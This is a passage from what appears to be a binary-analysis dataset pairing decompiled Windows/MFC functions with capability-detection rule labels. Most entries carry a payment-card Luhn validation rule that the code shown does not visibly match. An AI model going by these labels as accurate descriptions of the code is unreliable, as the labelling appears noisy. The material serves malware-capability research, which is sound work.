        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: lpWndClass\n// WARNING: Variable defined which should be unmapped: var_24h\n// WARNING: Variable defined which should be unmapped: var_20h\n// WARNING: Variable defined which should be unmapped: var_1ch\n// WARNING: Variable defined which should be unmapped: var_18h\n// WARNING: Variable defined which should be unmapped: var_14h\n// WARNING: Variable defined which should be unmapped: var_10h\n// WARNING: Variable defined which should be unmapped: var_ch\n// WARNING: Variable defined which should be unmapped: var_8h\n// WARNING: Variable defined which should be unmapped: var_4h\n\nint32_t __cdecl fcn.0042a818(uint arg_8h, int32_t arg_ch, int32_t arg_10h, int32_t arg_14h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint unaff_EBX;\n    uint unaff_EBP;\n    uint unaff_ESI;\n    uint unaff_EDI;\n    uint noname_1;\n    uint *noname_3;\n    uint lpWndClass;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    int32_t var_14h;\n    int32_t var_10h;\n    int32_t var_ch;\n    uint var_8h;\n    int32_t var_4h;\n    \n    iVar1 = fcn.00444bc2();\n    iVar1 = iVar1 + 0x7c;\n    iVar2 = fcn.00444bf8();\n    var_18h = *(iVar2 + 8);\n    if (((arg_ch == 0) && (arg_10h == 0)) && (arg_14h == 0)) {\n        fcn.0041205e(iVar1, \"Afx:%p:%x\", var_18h);\n    }\n    else {\n        fcn.0041205e(iVar1, \"Afx:%p:%x:%p:%p:%p\", var_18h);\n    }\n    noname_3 = &lpWndClass;\n    noname_1 = var_18h;\n    iVar2 = iVar1;\n    iVar3 = (*_sym.imp.USER32.dll_GetClassInfoA)();\n    if (iVar3 == 0) {\n        lpWndClass = arg_8h;\n        var_24h = _sym.imp.USER32.dll_DefWindowProcA;\n        var_1ch = 0;\n        var_20h = 0;\n        var_8h = 0;\n        var_14h = arg_14h;\n        var_10h = arg_ch;\n        var_ch = arg_10h;\n        var_4h = iVar1;\n        iVar2 = fcn.00429a6d(&lpWndClass, noname_1, iVar2, noname_3, unaff_EDI, unaff_ESI, unaff_EBX, arg_8h, \n                             _sym.imp.USER32.dll_DefWindowProcA, 0, 0, var_18h, arg_14h, arg_ch, arg_10h, 0, iVar1, \n                             unaff_EBP);\n        if (iVar2 == 0) {\n            fcn.0043304a();\n        }\n    }\n    return iVar1;\n}\n",
        "token_count": 758
    },
    "0042b459": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint fcn.0042b459(void)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    uint32_t unaff_retaddr;\n    \n    iVar1 = fcn.0042b3b6(0);\n    if (iVar1 == 0) {\n        return 0;\n    }\n    if (*(iVar1 + 0x20) != 0) {\n        for (puVar2 = *(*(iVar1 + 0x20) + ((unaff_retaddr >> 4) % *(iVar1 + 0x24)) * 4); puVar2 != NULL;\n            puVar2 = *puVar2) {\n            if (puVar2[1] == unaff_retaddr) {\n                return puVar2[2];\n            }\n        }\n    }\n    return 0;\n}\n",
        "token_count": 179
    },
    "0042e593": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0042e593(int32_t param_1)\n\n{\n    if (*(param_1 + 0x10) != 0) {\n    // WARNING: Could not recover jumptable at 0x0042e59c. Too many branches\n    // WARNING: Treating indirect jump as call\n        (**(*(param_1 + 0x10) + 0x1c))();\n        return;\n    }\n    return;\n}\n",
        "token_count": 100
    },
    "0042e5a0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint32_t __cdecl\nfcn.0042e5a0(uint arg_8h, uint *arg_ch, uint noname_2, code *arg_14h, uint *arg_18h, int32_t arg_1ch, uint *arg_20h)\n\n{\n    uint32_t uVar1;\n    \n    uVar1 = 1;\n    if (arg_20h != NULL) {\n        *arg_20h = arg_8h;\n        arg_20h[1] = arg_14h;\n        return 1;\n    }\n    if (0xb < arg_1ch - 0x35U) {\n        return 0;\n    }\n    // switch table (12 cases) at 0x42e686\n    switch(*((arg_1ch - 0x35U) * 4 + 0x42e686)) {\n    case 0x42e5d7:\n        (*arg_14h)();\n        break;\n    case 0x42e5e2:\n        uVar1 = (*arg_14h)();\n        break;\n    case 0x42e5ed:\n        arg_18h = arg_ch;\n        goto code_r0x0042e667;\n    case 0x42e5f2:\n        arg_18h = arg_ch;\n        goto code_r0x0042e672;\n    case 0x42e5f7:\n        (*arg_14h)(arg_18h[1], *arg_18h);\n        break;\n    case 0x42e607:\n        uVar1 = (*arg_14h)(arg_18h[1], *arg_18h);\n        break;\n    case 0x42e617:\n        (*arg_14h)(arg_ch, arg_18h[1], *arg_18h);\n        break;\n    case 0x42e62a:\n        uVar1 = (*arg_14h)(arg_ch, arg_18h[1], *arg_18h);\n        break;\n    case 0x42e63d:\n        (*arg_14h)(arg_18h);\n        goto code_r0x0042e656;\n    case 0x42e649:\n        (*arg_14h)(arg_18h, arg_ch);\ncode_r0x0042e656:\n        uVar1 = arg_18h[7] == 0;\n        arg_18h[7] = 0;\n        break;\n    case 0x42e664:\ncode_r0x0042e667:\n        (*arg_14h)(arg_18h);\n        break;\n    case 0x42e66f:\ncode_r0x0042e672:\n        uVar1 = (*arg_14h)(arg_18h);\n    }\n    return uVar1;\n}\n",
        "token_count": 617
    },
    "0042eed3": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __thiscall fcn.0042eed3(int32_t *param_1, int32_t param_2)\n\n{\n    uint *puVar1;\n    int32_t iVar2;\n    uint arg_14h;\n    \n    puVar1 = (**(*param_1 + 0x28))();\n    do {\n        if (puVar1 == NULL) {\n            return 0;\n        }\n        arg_14h = 0;\n        if (*(param_2 + 4) < 0xc000) {\n            iVar2 = fcn.00429ba5(puVar1[1], *(param_2 + 4), 0, 0);\n            if (iVar2 != 0) {\ncode_r0x0042ef08:\n                (**(iVar2 + 0x14))(*(param_2 + 8), *(param_2 + 0xc));\n                return 1;\n            }\n        }\n        else {\n            iVar2 = puVar1[1];\n            while (iVar2 = fcn.00429ba5(iVar2, 0xc000, 0, arg_14h),  iVar2 != 0) {\n                if (**(iVar2 + 0x10) == *(param_2 + 4)) goto code_r0x0042ef08;\n                iVar2 = iVar2 + 0x18;\n            }\n        }\n        puVar1 = *puVar1;\n    } while( true );\n}\n",
        "token_count": 316
    },
    "0042f352": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nbool __thiscall fcn.0042f352(int32_t param_1, int32_t param_2)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t unaff_EBX;\n    int32_t arg_8h;\n    \n    if (param_2 < 1) {\n        iVar3 = *(param_1 + 0x1c);\n        if (((iVar3 != 0) && (*(iVar3 + 0x1c) != 0)) &&\n           (iVar1 = (*_sym.imp.USER32.dll_IsWindowVisible)(*(iVar3 + 0x1c)),  iVar1 != 0)) {\n            fcn.0042bc54(iVar3, *(iVar3 + 0x1c), 0x363, 1, 0);\n            fcn.0042bf5c(*(iVar3 + 0x1c), 0x363, 1, 0, 1, 1);\n        }\n        fcn.00444bf8();\n        arg_8h = 0x444b92;\n        iVar1 = fcn.00446580(0x444b92);\n        for (iVar1 = *(iVar1 + 8); iVar1 != 0; iVar1 = *(iVar1 + 0x68)) {\n            if ((*(iVar1 + 0x1c) != 0) && (iVar1 != iVar3)) {\n                if (*(iVar1 + 0x9c) == 0) {\n                    fcn.0042de3e(0, arg_8h);\n                }\n                iVar2 = (*_sym.imp.USER32.dll_IsWindowVisible)(*(iVar1 + 0x1c));\n                if ((iVar2 != 0) || (-1 < *(iVar1 + 0x9c))) {\n                    fcn.0042bc54(iVar1, *(iVar1 + 0x1c), 0x363, 1, 0);\n                    arg_8h = *(iVar1 + 0x1c);\n                    fcn.0042bf5c(arg_8h, 0x363, 1, 0, 1, 1);\n                }\n                iVar2 = *(iVar1 + 0x9c);\n                if (0 < iVar2) {\n                    fcn.0042de3e();\n                    arg_8h = iVar2;\n                }\n                *(iVar1 + 0x9c) = 0xffffffff;\n            }\n        }\n    }\n    else {\n        fcn.00444bf8();\n        iVar3 = fcn.00446580(0x444b92);\n        if (*(iVar3 + 0x10) == 0) {\n            fcn.004307b5();\n            fcn.004309ad(1);\n        }\n    }\n    return unaff_EBX < 0;\n}\n",
        "token_count": 632
    },
    "0042f7de": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint fcn.0042f7de(void)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    uint32_t unaff_retaddr;\n    \n    iVar1 = fcn.0042f754(0);\n    if (iVar1 == 0) {\n        return 0;\n    }\n    if (*(iVar1 + 0x20) != 0) {\n        for (puVar2 = *(*(iVar1 + 0x20) + ((unaff_retaddr >> 4) % *(iVar1 + 0x24)) * 4); puVar2 != NULL;\n            puVar2 = *puVar2) {\n            if (puVar2[1] == unaff_retaddr) {\n                return puVar2[2];\n            }\n        }\n    }\n    return 0;\n}\n",
        "token_count": 178
    },
    "0043014a": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __thiscall fcn.0043014a(int32_t *param_1, uint param_2, int32_t param_3)\n\n{\n    int32_t iVar1;\n    uint arg_8h;\n    \n    param_1[1] = param_3;\n    iVar1 = (*_sym.imp.KERNEL32.dll_GlobalAlloc)(0x40);\n    *param_1 = iVar1;\n    if (iVar1 != 0) {\n        arg_8h = (*_sym.imp.KERNEL32.dll_GlobalLock)(iVar1);\n        fcn.00411970(arg_8h, param_3 + 0x40, param_1[1]);\n        iVar1 = fcn.00430123(arg_8h);\n        param_1[2] = iVar1 == 0;\n        (*_sym.imp.KERNEL32.dll_GlobalUnlock)(*param_1);\n        iVar1 = 1;\n    }\n    return iVar1;\n}\n",
        "token_count": 207
    },
    "004301e3": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.004301e3(int32_t param_1)\n\n{\n    int16_t iVar1;\n    int16_t *piVar2;\n    \n    if (*(param_1 + 2) == -1) {\n        piVar2 = param_1 + 0x1a;\n    }\n    else {\n        piVar2 = param_1 + 0x12;\n    }\n    if (*piVar2 == -1) {\n        piVar2 = piVar2 + 2;\n    }\n    else {\n        do {\n            iVar1 = *piVar2;\n            piVar2 = piVar2 + 1;\n        } while (iVar1 != 0);\n    }\n    if (*piVar2 == -1) {\n        piVar2 = piVar2 + 2;\n    }\n    else {\n        do {\n            iVar1 = *piVar2;\n            piVar2 = piVar2 + 1;\n        } while (iVar1 != 0);\n    }\n    do {\n        iVar1 = *piVar2;\n        piVar2 = piVar2 + 1;\n    } while (iVar1 != 0);\n    return;\n}\n",
        "token_count": 251
    },
    "00430dcc": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_10h\n// WARNING: Variable defined which should be unmapped: var_ch\n// WARNING: Variable defined which should be unmapped: var_4h\n\nuint __cdecl fcn.00430dcc(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t *piVar1;\n    uint uVar2;\n    int32_t iVar3;\n    int32_t *piVar4;\n    int32_t iVar5;\n    int32_t unaff_EBP;\n    uint *in_FS_OFFSET;\n    uint var_10h;\n    uint var_ch;\n    uint var_4h;\n    \n    fcn.004118b0();\n    *(unaff_EBP + -0x10) = 0;\n    piVar1 = *(unaff_EBP + 0xc);\n    piVar4 = (**(**(*piVar1 + -0x10) + 0x10))();\n    iVar5 = (**(*piVar4 + 0xc))();\n    *(unaff_EBP + 0xc) = iVar5 + 0x10;\n    iVar5 = **(unaff_EBP + 0x10);\n    uVar2 = *(iVar5 + -0xc);\n    iVar3 = *piVar1;\n    *(unaff_EBP + -4) = 0;\n    fcn.00402530(unaff_EBP + 0xc, iVar3, *(iVar3 + -0xc), iVar5, uVar2);\n    fcn.004019a0(unaff_EBP + 0xc);\n    fcn.00401200();\n    uVar2 = *(unaff_EBP + 8);\n    *in_FS_OFFSET = *(unaff_EBP + -0xc);\n    return uVar2;\n}\n",
        "token_count": 394
    },
    "00430f14": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_10h\n// WARNING: Variable defined which should be unmapped: var_4h\n// WARNING: Variable defined which should be unmapped: var_ch\n\ncode ** __cdecl fcn.00430f14(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h)\n\n{\n    code *arg_10h_00;\n    uint uVar1;\n    code **ppcVar2;\n    code *pcVar3;\n    code **extraout_ECX;\n    int32_t unaff_EBP;\n    uint *in_FS_OFFSET;\n    uint var_10h;\n    uint var_ch;\n    uint var_4h;\n    \n    fcn.004118b0();\n    *(unaff_EBP + -0x10) = extraout_ECX;\n    *extraout_ECX = vtable.CRecentFileList.0;\n    fcn.00402490();\n    *(unaff_EBP + -4) = 0;\n    fcn.00402490();\n    fcn.00402490();\n    arg_10h_00 = *(unaff_EBP + 0x14);\n    *(unaff_EBP + -4) = 2;\n    ppcVar2 = fcn.0042eabb(arg_10h_00 * 4 + 4);\n    if (ppcVar2 == NULL) {\n        pcVar3 = NULL;\n    }\n    else {\n        *ppcVar2 = arg_10h_00;\n        *(unaff_EBP + 0x14) = ppcVar2 + 1;\n        fcn.00412f9d(ppcVar2 + 1, 4, arg_10h_00, fcn.00402490);\n        pcVar3 = *(unaff_EBP + 0x14);\n    }\n    uVar1 = *(unaff_EBP + 0xc);\n    extraout_ECX[2] = pcVar3;\n    pcVar3 = *(unaff_EBP + 8);\n    extraout_ECX[1] = arg_10h_00;\n    extraout_ECX[5] = pcVar3;\n    fcn.00401c20(uVar1);\n    fcn.00401c20(*(unaff_EBP + 0x10));\n    uVar1 = *(unaff_EBP + -0xc);\n    extraout_ECX[6] = *(unaff_EBP + 0x18);\n    *in_FS_OFFSET = uVar1;\n    return extraout_ECX;\n}\n",
        "token_count": 567
    },
    "00431904": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00431904(void)\n\n{\n    uint uVar1;\n    uint unaff_retaddr;\n    \n    uVar1 = fcn.004019c0(0x104);\n    fcn.00411850(uVar1, 0, 0x104);\n    (*_sym.imp.KERNEL32.dll_lstrcpynA)(uVar1, unaff_retaddr, 0x104);\n    (*_sym.imp.SHLWAPI.dll_PathStripToRootA)(uVar1);\n    fcn.004059a0(0xffffffff);\n    return;\n}\n",
        "token_count": 126
    },
    "00431d04": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "encrypt data using RC4 KSA/41e5dbd1fcbf406ebac8c999dfc1b5ff"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_108h\n\nvoid __cdecl fcn.00431d04(uint arg_8h, uint *arg_ch)\n\n{\n    uint var_108h;\n    uint var_104h;\n    uint var_4h;\n    \n    var_4h = *0x4640c8;\n    (*_sym.imp.USER32.dll_wsprintfA)\n              (&var_104h, \"{%08X-%04X-%04X-%02X%02X-%02X%02X%02X%02X%02X%02X}\", *arg_ch, *(arg_ch + 1), *(arg_ch + 6), \n               *(arg_ch + 2), *(arg_ch + 9), *(arg_ch + 10), *(arg_ch + 0xb), *(arg_ch + 3), *(arg_ch + 0xd), \n               *(arg_ch + 0xe), *(arg_ch + 0xf), 0);\n    fcn.00401ce0(&var_104h);\n    fcn.0041176c();\n    return;\n}\n",
        "token_count": 241
    },
    "00431d86": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "link function at runtime on Windows"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_10h\n// WARNING: Variable defined which should be unmapped: var_ch\n// WARNING: Variable defined which should be unmapped: var_4h\n\nuint __cdecl fcn.00431d86(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    uint *puVar1;\n    int32_t *piVar2;\n    int32_t iVar3;\n    code *pcVar4;\n    int32_t unaff_EBP;\n    uint uVar5;\n    uint *in_FS_OFFSET;\n    uint var_10h;\n    uint var_ch;\n    uint var_4h;\n    \n    fcn.004118b0();\n    puVar1 = *(unaff_EBP + 0x10);\n    *puVar1 = 0;\n    fcn.00431d04(unaff_EBP + -0x10, *(unaff_EBP + 8));\n    *(unaff_EBP + -4) = 0;\n    piVar2 = fcn.004290ee();\n    iVar3 = (**(*piVar2 + 0xc))();\n    *(unaff_EBP + 0x10) = iVar3 + 0x10;\n    *(unaff_EBP + -4) = 1;\n    iVar3 = fcn.00431854(*(unaff_EBP + -0x10), unaff_EBP + 0x10);\n    if (iVar3 != 0) {\n        iVar3 = (*_sym.imp.KERNEL32.dll_LoadLibraryA)(*(unaff_EBP + 0x10));\n        if (iVar3 != 0) {\n            pcVar4 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(iVar3, \"DllGetClassObject\");\n            if (pcVar4 == NULL) {\n                uVar5 = 0x800401f9;\n            }\n            else {\n                uVar5 = (*pcVar4)(*(unaff_EBP + 8), *(unaff_EBP + 0xc), puVar1);\n            }\n            goto code_r0x00431e06;\n        }\n    }\n    uVar5 = 0x80040154;\ncode_r0x00431e06:\n    fcn.00401200();\n    fcn.00401200();\n    *in_FS_OFFSET = *(unaff_EBP + -0xc);\n    return uVar5;\n}\n",
        "token_count": 524
    },
    "00432048": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint fcn.00432048(uint32_t param_1)\n\n{\n    int32_t iVar1;\n    \n    if (0x10b < param_1) {\n        if (param_1 == 0x3e3) {\n            return 10;\n        }\n        if (param_1 == 0x3e4) {\n            return 10;\n        }\n        if (param_1 == 0x3e5) {\n            return 10;\n        }\n        if (param_1 == 999) {\n            return 5;\n        }\n        return 1;\n    }\n    if (param_1 == 0x10b) {\n        return 3;\n    }\n    if (param_1 < 0x3f) {\n        if (param_1 == 0x3e) {\n            return 8;\n        }\n        if (param_1 < 0x1a) {\n    // switch table (25 cases) at 0x432226\n            switch(param_1) {\n            case 0:\n                return 0;\n            case 1:\n            case 7:\n            case 8:\n            case 9:\n            case 10:\n            case 0xd:\n            case 0xe:\n                goto code_r0x00432143;\n            case 2:\n            case 6:\n            case 0x12:\n                goto code_r0x00432143;\n            case 3:\n            case 0xf:\n            case 0x11:\n                goto code_r0x00432143;\n            case 4:\n                return 4;\n            case 5:\n            case 0xc:\n            case 0x13:\ncode_r0x00432143:\n                return 5;\n            case 0xb:\ncode_r0x00432143:\n                return 6;\n            case 0x10:\n                return 7;\n            case 0x14:\n            case 0x15:\n            case 0x16:\n            case 0x17:\ncode_r0x00432143:\n                return 10;\n            default:\n                goto code_r0x00432143;\n            }\n        }\n        if (0x27 < param_1) {\n    // switch table (9 cases) at 0x43228a\n            switch(param_1) {\n            case 0x34:\n            case 0x35:\n            case 0x37:\n                goto code_r0x00432143;\n            case 0x36:\n            case 0x3a:\n                goto code_r0x00432143;\n            default:\n                return 1;\n            case 0x39:\n            case 0x3b:\n                goto code_r0x00432143;\n            case 0x3c:\n                goto code_r0x00432143;\n            }\n        }\n        if (param_1 == 0x27) {\n            return 0xd;\n        }\n        if (0x20 < param_1) {\n            if (param_1 == 0x21) {\n                return 0xc;\n            }\n            if (param_1 == 0x22) {\n                return 3;\n            }\n            if (param_1 == 0x24) {\n                return 4;\n            }\n            if (param_1 == 0x26) {\n                return 0xe;\n            }\n            return 1;\n        }\n        if (param_1 == 0x20) {\n            return 0xb;\n        }\n        if (param_1 == 0x1a) {\n            return 6;\n        }\n        if (param_1 == 0x1b) {\n            return 9;\n        }\n        iVar1 = param_1 - 0x1d;\n        if (iVar1 == 0) {\n            return 5;\n        }\ncode_r0x0043218f:\n        if (iVar1 == 1) {\ncode_r0x00432143:\n            return 9;\n        }\n    }\n    else {\n        if (param_1 < 0x6c) {\n            if (param_1 == 0x6b) {\ncode_r0x00432143:\n                return 2;\n            }\n            if (0x47 < param_1) {\n                if (param_1 == 0x50) {\n                    return 5;\n                }\n                if (param_1 == 0x52) {\n                    return 5;\n                }\n                if (param_1 == 0x55) {\n                    return 3;\n                }\n                if (param_1 != 0x56) {\n                    if (param_1 == 0x58) {\n                        return 10;\n                    }\n                    return 1;\n                }\n                return 5;\n            }\n            if (param_1 == 0x47) {\n                return 5;\n            }\n            if (param_1 == 0x40) {\n                return 5;\n            }\n            if (param_1 == 0x41) {\n                return 5;\n            }\n            if (param_1 == 0x42) {\n                return 6;\n            }\n            if (param_1 == 0x43) {\n                return 3;\n            }\n            iVar1 = param_1 - 0x44;\n            if (iVar1 == 0) {\n                return 4;\n            }\n        }\n        else {\n            if (param_1 < 0x91) {\n                if (param_1 == 0x90) {\n                    return 3;\n                }\n                if (param_1 < 0x76) {\n                    if (param_1 == 0x75) {\n                        return 10;\n                    }\n                    if (param_1 == 0x6c) {\n                        return 0xc;\n                    }\n                    if (param_1 == 0x6f) {\n                        return 3;\n                    }\n                    if (param_1 == 0x70) {\n                        return 0xd;\n                    }\n                    if (param_1 == 0x71) {\n                        return 4;\n                    }\n                    if (param_1 != 0x72) {\n                        return 1;\n                    }\n                    return 6;\n                }\n                if (param_1 == 0x7b) {\n                    return 3;\n                }\n                if (param_1 == 0x7c) {\n                    return 3;\n                }\n                if (param_1 == 0x7d) {\n                    return 3;\n                }\n                iVar1 = param_1 - 0x83;\n                if (iVar1 == 0) {\n                    return 9;\n                }\n                goto code_r0x0043218f;\n            }\n            if (param_1 < 0xb7) {\n                if (param_1 == 0xb6) {\n                    return 6;\n                }\n                if (param_1 == 0x91) {\n                    return 7;\n                }\n                if (param_1 == 0x9a) {\n                    return 3;\n                }\n                if (param_1 != 0xa1) {\n                    if (param_1 == 0xa7) {\n                        return 0xc;\n                    }\n                    if (param_1 == 0xaa) {\n                        return 5;\n                    }\n                    return 1;\n                }\n                return 3;\n            }\n            if (param_1 == 0xb7) {\n                return 5;\n            }\n            if (param_1 == 0xbf) {\n                return 6;\n            }\n            if (param_1 == 0xc1) {\n                return 6;\n            }\n            iVar1 = param_1 - 0xce;\n            if (iVar1 == 0) {\n                return 3;\n            }\n        }\n        if (iVar1 == 2) {\ncode_r0x00432143:\n            return 3;\n        }\n    }\ncode_r0x00432143:\n    return 1;\n}\n",
        "token_count": 1715
    },
    "00433092": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00433092(uint arg_8h)\n\n{\n    int32_t in_ECX;\n    uint var_14h;\n    uint var_10h;\n    \n    fcn.00411850(&var_14h, 0, 0x14);\n    var_10h = arg_8h;\n    var_14h = 0x14;\n    (*_sym.imp.GDI32.dll_StartDocA)(*(in_ECX + 4), &var_14h);\n    return;\n}\n",
        "token_count": 114
    },
    "00434d01": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00434d01(uint arg_8h, uint *arg_ch)\n\n{\n    int32_t iVar1;\n    uchar *puVar2;\n    uint uVar3;\n    uint var_104h;\n    uint var_4h;\n    \n    var_4h = *0x4640c8;\n    iVar1 = fcn.00428f87(arg_8h, &var_104h, 0x100);\n    if (iVar1 != 0) {\n        puVar2 = fcn.00411e20(&var_104h, 10);\n        if (puVar2 != NULL) {\n            uVar3 = fcn.00412844(puVar2 + 1);\n            *arg_ch = uVar3;\n            uVar3 = (*_sym.imp.KERNEL32.dll_MulDiv)(uVar3, *0x466dc4, 0x48);\n            *arg_ch = uVar3;\n            *puVar2 = 0;\n        }\n        (*_sym.imp.KERNEL32.dll_lstrcpynA)(arg_ch + 7, &var_104h, 0x20);\n    }\n    fcn.0041176c();\n    return;\n}\n",
        "token_count": 268
    },
    "0043899f": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n// WARNING: Variable defined which should be unmapped: var_10h\n// WARNING: Variable defined which should be unmapped: var_ch\n\nvoid __cdecl fcn.0043899f(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    uint extraout_ECX;\n    int32_t unaff_EBP;\n    uint *in_FS_OFFSET;\n    uint var_10h;\n    uint var_ch;\n    uint var_4h;\n    \n    fcn.004118b0();\n    piVar1 = fcn.004290ee(extraout_ECX);\n    iVar2 = (**(*piVar1 + 0xc))();\n    *(unaff_EBP + -0x10) = iVar2 + 0x10;\n    *(unaff_EBP + -4) = 0;\n    iVar2 = fcn.00401bb0(*(unaff_EBP + 0xc));\n    if (iVar2 == 0) {\n        fcn.00401200();\n    }\n    else {\n        fcn.004388a0(*(unaff_EBP + 8), *(unaff_EBP + -0x10), *(unaff_EBP + 0x10), *(unaff_EBP + 0x14));\n        fcn.00401200();\n    }\n    *in_FS_OFFSET = *(unaff_EBP + -0xc);\n    return;\n}\n",
        "token_count": 338
    },
    "00438ab1": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t fcn.00438ab1(int32_t param_1)\n\n{\n    if ((param_1 < 0) || (0x15 < param_1)) {\n        param_1 = -1;\n    }\n    else {\n        param_1 = param_1 + 0x40000;\n    }\n    return param_1;\n}\n",
        "token_count": 77
    },
    "0043a351": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0043a351(uint param_1, uint param_2, int32_t param_3, code *param_4)\n\n{\n    if (-1 < param_3 + -1) {\n        do {\n            (*param_4)();\n            param_3 = param_3 + -1;\n        } while (param_3 != 0);\n    }\n    return;\n}\n",
        "token_count": 84
    },
    "0043b5a2": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0043b5a2(int32_t arg_8h, uint *arg_ch)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    uint uVar3;\n    int32_t *in_ECX;\n    int32_t lpRect;\n    int32_t var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    arg_ch[1] = arg_ch[1] | 0x70;\n    *arg_ch = 0x50;\n    arg_ch[8] = *(arg_8h + 0x1c);\n    piVar1 = fcn.0042ffac(0x4522ac, arg_8h);\n    if (piVar1 == NULL) {\n        (*_sym.imp.USER32.dll_GetWindowRect)(*(arg_8h + 0x1c), &lpRect);\n        var_8h = var_8h - lpRect;\n        var_4h = var_4h - var_ch;\n    }\n    else {\n        piVar1 = (**(*piVar1 + 0x130))(&var_8h, 0, in_ECX[0x1f] & 0xa000);\n        var_8h = *piVar1;\n        var_4h = piVar1[1];\n    }\n    arg_ch[10] = var_4h;\n    if (*0x463e34 < 0x40048) {\n        iVar2 = 4;\n    }\n    else {\n        iVar2 = 0;\n    }\n    iVar2 = iVar2 + var_8h;\n    arg_ch[0x11] = iVar2;\n    arg_ch[0xb] = iVar2;\n    if ((arg_ch[2] & 0x200) == 0) {\n        arg_ch[9] = iVar2;\n    }\n    else {\n        arg_ch[1] = arg_ch[1] | 0x200;\n        arg_ch[9] = var_4h;\n    }\n    iVar2 = (**(*in_ECX + 0x110))(0x401, 0xffffffff, arg_ch);\n    if (iVar2 == 0) {\n        uVar3 = 0;\n    }\n    else {\n        piVar1 = fcn.0042bedc();\n        if (piVar1 != NULL) {\n            (**(*piVar1 + 0x144))(1);\n        }\n        (*_sym.imp.USER32.dll_SendMessageA)(in_ECX[7], 0x41f, 0, 0);\n        uVar3 = 1;\n    }\n    return uVar3;\n}\n",
        "token_count": 583
    },
    "0043b92a": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0043b92a(uint noname_0, int32_t *arg_ch)\n\n{\n    int32_t in_ECX;\n    int32_t var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    (*_sym.imp.USER32.dll_SetRectEmpty)(&var_10h);\n    fcn.0043bb81(&var_10h, (*(in_ECX + 0x7c) & 0xa000) != 0);\n    *arg_ch = *arg_ch + var_10h;\n    arg_ch[1] = arg_ch[1] + var_ch;\n    arg_ch[2] = arg_ch[2] + var_8h;\n    arg_ch[3] = arg_ch[3] + var_4h;\n    return;\n}\n",
        "token_count": 192
    },
    "0043ccd5": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
